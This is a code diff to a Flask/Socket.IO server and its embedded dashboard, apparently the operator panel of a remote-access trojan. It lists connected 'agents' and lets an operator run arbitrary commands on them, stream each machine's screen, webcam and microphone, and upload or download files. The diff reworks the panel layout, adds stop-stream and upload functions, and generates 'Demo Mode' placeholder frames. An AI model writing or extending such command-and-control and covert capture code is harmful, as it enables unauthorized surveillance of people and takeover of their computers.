+                            <div class="metric-value" id="streams-active">0</div>
+                            <div class="metric-label">Active Streams</div>
+                        </div>
+                        <div class="metric-card">
+                            <div class="metric-value" id="system-status">OK</div>
+                            <div class="metric-label">System Status</div>
+                        </div>
+                    </div>
+                    
+                    <div class="control-group">
+                        <div class="control-header">Output Terminal</div>
+                        <div class="terminal" id="output-terminal">System ready...</div>
+                    </div>
+                    
+                    <div class="control-group">
+                        <div class="control-header">Configuration</div>
+                        <div id="config-status" class="status-display">Checking configuration...</div>
+                    </div>
+                    
+                    <div class="control-group">
+                        <div class="control-header">Password Management</div>
+                        <input type="password" class="neural-input" id="new-password" placeholder="New password">
+                        <button class="btn" onclick="changePassword()">Change Password</button>
                     </div>
                 </div>
             </div>
         </div>
+    </div>
 
-        <!-- Video Stream Panel -->
-        <div class="panel">
-            <div class="panel-header">
-                <div class="panel-icon">🎥</div>
-                <div class="panel-title">Live Video Stream (H.264)</div>
-            </div>
-            <video id="h264-video" width="640" height="360" controls autoplay muted style="background:#000; width:100%; max-width:100%; border-radius:10px;"></video>
-            <div id="video-status" style="color:#00d4ff; margin-top:10px;"></div>
-        </div>
 
-        <!-- WebRTC Stream Panel -->
-        <div class="panel">
-            <div class="panel-header">
-                <div class="panel-icon">🌐</div>
-                <div class="panel-title">WebRTC Stream (Low Latency)</div>
-            </div>
-            <div class="webrtc-controls">
-                <button class="btn btn-success" onclick="startWebRTCStream()">Start WebRTC</button>
-                <button class="btn btn-danger" onclick="stopWebRTCStream()">Stop WebRTC</button>
-                <button class="btn" onclick="getWebRTCStats()">Get Stats</button>
-            </div>
-            <video id="webrtc-video" width="640" height="360" controls autoplay muted style="background:#000; width:100%; max-width:100%; border-radius:10px; margin-top:10px;"></video>
-            <div id="webrtc-status" style="color:#00d4ff; margin-top:10px;"></div>
-            <div id="webrtc-stats" style="color:#a0a0a0; margin-top:10px; font-size:0.9rem;"></div>
-        </div>
-        <!-- Output Terminal -->
-        <div class="panel">
-            <div class="panel-header">
-                <div class="panel-icon">💻</div>
-                <div class="panel-title">Neural Terminal</div>
-            </div>
-            <div class="output-terminal" id="output-display">System ready. Awaiting commands...</div>
-        </div>
+                    <div class="control-group">
+                        <div class="control-header">Change Admin Password</div>
 
-        <!-- Configuration Status -->
-        <div class="panel">
-            <div class="panel-header">
-                <div class="panel-icon">⚙️</div>
-                <div class="panel-title">System Configuration</div>
-            </div>
-            <div class="config-status" id="config-status">
-                <div class="config-item">
-                    <span class="config-label">Admin Password:</span>
-                    <span class="config-value" id="admin-password-status">Checking...</span>
-                </div>
-                <div class="config-item">
-                    <span class="config-label">Hash Algorithm:</span>
-                    <span class="config-value" id="hash-algorithm">Checking...</span>
-                </div>
-                <div class="config-item">
-                    <span class="config-label">Session Timeout:</span>
-                    <span class="config-value" id="session-timeout">Checking...</span>
-                </div>
-                <div class="config-item">
-                    <span class="config-label">Max Login Attempts:</span>
-                    <span class="config-value" id="max-login-attempts">Checking...</span>
-                </div>
-                <div class="config-item">
-                    <span class="config-label">Blocked IPs:</span>
-                    <span class="config-value" id="blocked-ips">Checking...</span>
-                </div>
-                <button class="btn" onclick="refreshConfigStatus()">Refresh Status</button>
-            </div>
-        </div>
-
-        <!-- Password Management -->
-        <div class="panel">
-            <div class="panel-header">
-                <div class="panel-icon">🔐</div>
-                <div class="panel-title">Password Management</div>
-            </div>
-            <div class="password-management">
-                <div class="control-group">
-                    <div class="control-header">Change Admin Password</div>
-                    <div class="input-group">
-                        <label class="input-label">Current Password</label>
-                        <input type="password" class="neural-input" id="current-password" placeholder="Enter current password">
-                    </div>
-                    <div class="input-group">
-                        <label class="input-label">New Password</label>
-                        <input type="password" class="neural-input" id="new-password" placeholder="Enter new password (min 8 chars)">
-                    </div>
-                    <div class="input-group">
-                        <label class="input-label">Confirm New Password</label>
-                        <input type="password" class="neural-input" id="confirm-password" placeholder="Confirm new password">
-                    </div>
-                    <button class="btn" onclick="changePassword()">Change Password</button>
-                    <div id="password-change-status" class="status-indicator"></div>
-                </div>
-            </div>
-        </div>
 
         <!-- Hidden audio player for streams -->
         <audio id="audio-player" controls style="display:none; width: 100%; margin-top: 10px;"></audio>
@@ -1876,11 +2280,10 @@ DASHBOARD_HTML = r'''
             }
 
             selectedAgentId = agentId;
-            document.querySelectorAll('.agent-card').forEach(item => item.classList.remove('selected'));
+            document.querySelectorAll('.agent-item').forEach(item => item.classList.remove('selected'));
             element.classList.add('selected');
             document.getElementById('agent-id').value = agentId;
-            document.getElementById('output-display').textContent = `Agent ${agentId.substring(0,8)}... selected. Ready for commands.`;
-            document.getElementById('command-status').style.display = 'none';
+            document.getElementById('output-terminal').textContent = `Agent ${agentId.substring(0,8)}... selected. Ready for commands.`;
         }
 
         function updateAgentList(agents) {
@@ -1889,10 +2292,11 @@ DASHBOARD_HTML = r'''
 
             if (Object.keys(agents).length === 0) {
                 agentList.innerHTML = `
-                    <div class="no-agents">
-                        <div class="no-agents-icon">🤖</div>
-                        <div>No agents connected</div>
-                        <div style="font-size: 0.8rem; margin-top: 5px;">Waiting for neural links...</div>
+                    <div class="agent-item">
+                        <div class="agent-status">
+                            <div class="status-indicator offline"></div>
+                            <span>No agents connected</span>
+                        </div>
                     </div>
                 `;
                 return;
@@ -1900,22 +2304,24 @@ DASHBOARD_HTML = r'''
 
             for (const agentId in agents) {
                 const agent = agents[agentId];
-                const agentCard = document.createElement('div');
-                agentCard.className = 'agent-card';
-                agentCard.onclick = () => selectAgent(agentCard, agentId);
+                const agentItem = document.createElement('div');
+                agentItem.className = 'agent-item';
+                agentItem.onclick = () => selectAgent(agentItem, agentId);
                 
                 const lastSeen = new Date(agent.last_seen).toLocaleString();
-                agentCard.innerHTML = `
-                    <div class="agent-status"></div>
-                    <div class="agent-id">${agentId.substring(0, 8)}...</div>
-                    <div class="agent-info">Last seen: ${lastSeen}</div>
+                agentItem.innerHTML = `
+                    <div class="agent-status">
+                        <div class="status-indicator"></div>
+                        <span>${agentId.substring(0, 8)}...</span>
+                    </div>
+                    <div style="font-size: 0.75rem; color: var(--text-muted);">Last seen: ${lastSeen}</div>
                 `;
                 
                 if (agentId === selectedAgentId) {
-                    agentCard.classList.add('selected');
+                    agentItem.classList.add('selected');
                 }
                 
-                agentList.appendChild(agentCard);
+                agentList.appendChild(agentItem);
             }
         }
 
@@ -1932,7 +2338,7 @@ DASHBOARD_HTML = r'''
             }
 
             socket.emit('execute_command', { agent_id: selectedAgentId, command: command });
-            document.getElementById('output-display').textContent = `> ${command}\nExecuting...`;
+            document.getElementById('output-terminal').textContent = `> ${command}\nExecuting...`;
             document.getElementById('command').value = '';
         }
 
@@ -1951,9 +2357,9 @@ DASHBOARD_HTML = r'''
             issueCommandInternal(selectedAgentId, 'start-stream');
             issueCommandInternal(selectedAgentId, 'start-audio');
 
-            if (videoWindow && !videoWindow.closed) videoWindow.close();
-            videoWindow = window.open(`/video_feed/${selectedAgentId}`, `LiveStream_${selectedAgentId}`, 'width=800,height=600');
-
+            const screenVideo = document.getElementById('screen-video');
+            screenVideo.src = `/video_feed/${selectedAgentId}`;
+            
             audioPlayer = document.getElementById('audio-player');
             audioPlayer.src = `/audio_feed/${selectedAgentId}`;
             audioPlayer.style.display = 'block';
@@ -1969,9 +2375,33 @@ DASHBOARD_HTML = r'''
             }
 
             issueCommandInternal(selectedAgentId, 'start-camera');
-            if (cameraWindow && !cameraWindow.closed) cameraWindow.close();
-            cameraWindow = window.open(`/camera_feed/${selectedAgentId}`, `CameraStream_${selectedAgentId}`, 'width=640,height=480');
+            const cameraVideo = document.getElementById('camera-video');
+            cameraVideo.src = `/camera_feed/${selectedAgentId}`;
             showStatus('Camera stream started', 'success');
+        }
+
+        function stopScreenStream() {
+            if (!selectedAgentId) { 
+                showStatus('Please select an agent first.', 'error');
+                return; 
+            }
+            
+            issueCommandInternal(selectedAgentId, 'stop-stream');
+            const screenVideo = document.getElementById('screen-video');
+            screenVideo.src = '';
+            showStatus('Screen stream stopped', 'success');
+        }
+
+        function stopCameraStream() {
+            if (!selectedAgentId) { 
+                showStatus('Please select an agent first.', 'error');
+                return; 
+            }
+            
+            issueCommandInternal(selectedAgentId, 'stop-camera');
+            const cameraVideo = document.getElementById('camera-video');
+            cameraVideo.src = '';
+            showStatus('Camera stream stopped', 'success');
         }
 
         function stopAllStreams() {
@@ -1997,11 +2427,31 @@ DASHBOARD_HTML = r'''
         }
 
         function showStatus(message, type) {
-            const statusDiv = document.getElementById('command-status');
-            statusDiv.style.display = 'block';
-            statusDiv.className = `status-indicator status-${type}`;
+            // Create a temporary status display
+            const statusDiv = document.createElement('div');
+            statusDiv.className = `status-display status-${type}`;
             statusDiv.textContent = message;
-            setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
+            statusDiv.style.position = 'fixed';
+            statusDiv.style.top = '20px';
+            statusDiv.style.right = '20px';
+            statusDiv.style.zIndex = '1000';
+            statusDiv.style.padding = '12px 16px';
+            statusDiv.style.borderRadius = '6px';
+            statusDiv.style.color = 'white';
+            statusDiv.style.fontWeight = '500';
+            
+            if (type === 'error') {
+                statusDiv.style.background = 'var(--accent-red)';
+            } else if (type === 'success') {
+                statusDiv.style.background = 'var(--accent-green)';
+            } else {
+                statusDiv.style.background = 'var(--accent-blue)';
+            }
+            
+            document.body.appendChild(statusDiv);
+            setTimeout(() => { 
+                statusDiv.remove(); 
+            }, 3000);
         }
 
         // --- Socket.IO Event Handlers ---
@@ -2020,10 +2470,10 @@ DASHBOARD_HTML = r'''
 
         socket.on('command_output', (data) => {
             if (data.agent_id === selectedAgentId) {
-                const outputDisplay = document.getElementById('output-display');
+                const outputTerminal = document.getElementById('output-terminal');
                 // Append new output, keeping previous content
-                outputDisplay.textContent += `\n${data.output}`;
-                outputDisplay.scrollTop = outputDisplay.scrollHeight; // Scroll to bottom
+                outputTerminal.textContent += `\n${data.output}`;
+                outputTerminal.scrollTop = outputTerminal.scrollHeight; // Scroll to bottom
             }
         });
 
@@ -2286,6 +2736,46 @@ DASHBOARD_HTML = r'''
                 }
             };
             readSlice(0);
+        }
+
+        function uploadFile() {
+            const fileInput = document.getElementById('file-upload');
+            const file = fileInput.files[0];
+            if (!file) {
+                showStatus('Please select a file to upload.', 'error');
+                return;
+            }
+            if (!selectedAgentId) {
+                showStatus('Please select an agent first.', 'error');
+                return;
+            }
+            
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const chunkSize = 1024 * 1024; // 1MB chunks
+                const fileData = e.target.result;
+                const totalChunks = Math.ceil(fileData.byteLength / chunkSize);
+                
+                for (let i = 0; i < totalChunks; i++) {
+                    const chunk = fileData.slice(i * chunkSize, (i + 1) * chunkSize);
+                    socket.emit('upload_file_chunk', {
+                        agent_id: selectedAgentId,
+                        filename: file.name,
+                        chunk: Array.from(new Uint8Array(chunk)),
+                        chunk_index: i,
+                        total_chunks: totalChunks
+                    });
+                }
+                
+                socket.emit('upload_file_end', {
+                    agent_id: selectedAgentId,
+                    filename: file.name,
+                    total_size: fileData.byteLength
+                });
+                
+                showStatus('File upload started', 'success');
+            };
+            reader.readAsArrayBuffer(file);
         }
 
         function downloadFile() {
@@ -2595,65 +3085,7 @@ DASHBOARD_HTML = r'''
             document.getElementById('webrtc-stats').textContent = statsText;
         });
 
-        // --- WebRTC Command Functions ---
-        function startWebRTCCommand() {
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            
-            socket.emit('webrtc_start_streaming', {
-                agent_id: selectedAgentId,
-                type: 'all'  // Start all streams (screen, audio, camera)
-            });
-            
-            showStatus('Starting WebRTC streaming...', 'success');
-        }
 
-        function stopWebRTCCommand() {
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            
-            socket.emit('webrtc_stop_streaming', {
-                agent_id: selectedAgentId
-            });
-            
-            showStatus('Stopping WebRTC streaming...', 'success');
-        }
-
-        function getWebRTCStatsCommand() {
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            
-            socket.emit('webrtc_get_stats', {
-                agent_id: selectedAgentId
-            });
-            
-            showStatus('Requesting WebRTC stats...', 'success');
-        }
-
-        function setWebRTCQuality() {
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            
-            const quality = prompt('Enter quality (low/medium/high/auto):', 'auto');
-            if (quality && ['low', 'medium', 'high', 'auto'].includes(quality.toLowerCase())) {
-                socket.emit('webrtc_set_quality', {
-                    agent_id: selectedAgentId,
-                    quality: quality.toLowerCase()
-                });
-                
-                showStatus(`WebRTC quality set to ${quality}`, 'success');
-            } else {
-                showStatus('Invalid quality setting', 'error');
-            }
-        }
 
     </script>
 </body>
@@ -2716,9 +3148,33 @@ def video_feed(agent_id):
                 yield (b'--frame\r\n'
                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
             else:
-                # Send empty frame if no data available
+                # Generate a demo frame with agent ID for testing
+                import io
+                from PIL import Image, ImageDraw, ImageFont
+                
+                # Create a demo image
+                img = Image.new('RGB', (640, 480), color='#1e40af')
+                draw = ImageDraw.Draw(img)
+                
+                # Try to use a font, fallback to default if not available
+                try:
+                    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
+                except:
+                    font = ImageFont.load_default()
+                
+                # Draw demo text
+                draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
+                draw.text((320, 250), "Screen Stream", fill='white', anchor='mm', font=font)
+                draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
+                
+                # Convert to JPEG
+                img_io = io.BytesIO()
+                img.save(img_io, 'JPEG', quality=85)
+                img_io.seek(0)
+                demo_frame = img_io.getvalue()
+                
                 yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + b'\r\n')
+                       b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
             time.sleep(0.5)  # 2 FPS
     
     return Response(generate_video(),
@@ -2738,9 +3194,33 @@ def camera_feed(agent_id):
                 yield (b'--frame\r\n'
                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
             else:
-                # Send empty frame if no data available
+                # Generate a demo frame with agent ID for testing
+                import io
+                from PIL import Image, ImageDraw, ImageFont
+                
+                # Create a demo image
+                img = Image.new('RGB', (640, 480), color='#059669')
+                draw = ImageDraw.Draw(img)
+                
+                # Try to use a font, fallback to default if not available
+                try:
+                    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
+                except:
+                    font = ImageFont.load_default()
+                
+                # Draw demo text
+                draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
+                draw.text((320, 250), "Camera Stream", fill='white', anchor='mm', font=font)
+                draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
+                
+                # Convert to JPEG
+                img_io = io.BytesIO()
+                img.save(img_io, 'JPEG', quality=85)
+                img_io.seek(0)
+                demo_frame = img_io.getvalue()
+                
                 yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + b'\r\n')
+                       b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
             time.sleep(0.5)  # 2 FPS
     
     return Response(generate_camera(),
@@ -2965,8 +3445,12 @@ def handle_file_chunk_from_agent(data):
             'total_size': total_size
         }, room='operators')
 
-# Add a new buffer for H.264 frames
+# Global variables for WebRTC and video streaming
+WEBRTC_PEER_CONNECTIONS = {}
+WEBRTC_VIEWER_CONNECTIONS = {}
 VIDEO_FRAMES_H264 = defaultdict(lambda: None)
+CAMERA_FRAMES_H264 = defaultdict(lambda: None)
+AUDIO_FRAMES_OPUS = defaultdict(lambda: None)
 
 @socketio.on('screen_frame')
 def handle_screen_frame(data):
@@ -3000,9 +3484,7 @@ def handle_request_camera_frame(data):
         # Send as base64 for browser demo; in production, use ArrayBuffer/binary
         emit('camera_frame', {'frame': base64.b64encode(frame).decode('utf-8')})
 
-# Add new buffers for H.264 camera frames and Opus/PCM audio frames
-CAMERA_FRAMES_H264 = defaultdict(lambda: None)
-AUDIO_FRAMES_OPUS = defaultdict(lambda: None)
+
 
 @socketio.on('camera_frame')
 def handle_camera_frame(data):
